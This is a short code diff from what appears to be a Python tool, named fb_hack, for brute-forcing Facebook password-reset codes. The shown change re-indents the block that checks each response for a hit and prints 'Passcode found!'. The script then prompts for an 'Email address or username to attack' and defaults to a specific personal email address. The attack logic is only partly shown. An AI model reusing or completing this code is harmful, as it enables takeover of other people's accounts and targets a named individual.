@@ -103,19 +103,19 @@ def fb_hack(email, codex):
         else:
           break
   
-response1 = browser.response()
-soup = BeautifulSoup(response1, 'html.parser')
-if soup.find(string="password_new") == test:
-  print("Passcode not found")
-  with open("output1.html", "w") as file:
-      file.write(str(soup))
-  reset = attempt1
-elif soup.find(string="password_new") != test:
-  print("Passcode found!")
-  print(y)
-  browser.close()
-  reset = int(-1)
-return reset
+  response1 = browser.response()
+  soup = BeautifulSoup(response1, 'html.parser')
+  if soup.find(string="password_new") == test:
+    print("Passcode not found")
+    with open("output1.html", "w") as file:
+        file.write(str(soup))
+    reset = attempt1
+  elif soup.find(string="password_new") != test:
+    print("Passcode found!")
+    print(y)
+    browser.close()
+    reset = int(-1)
+  return reset
 
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
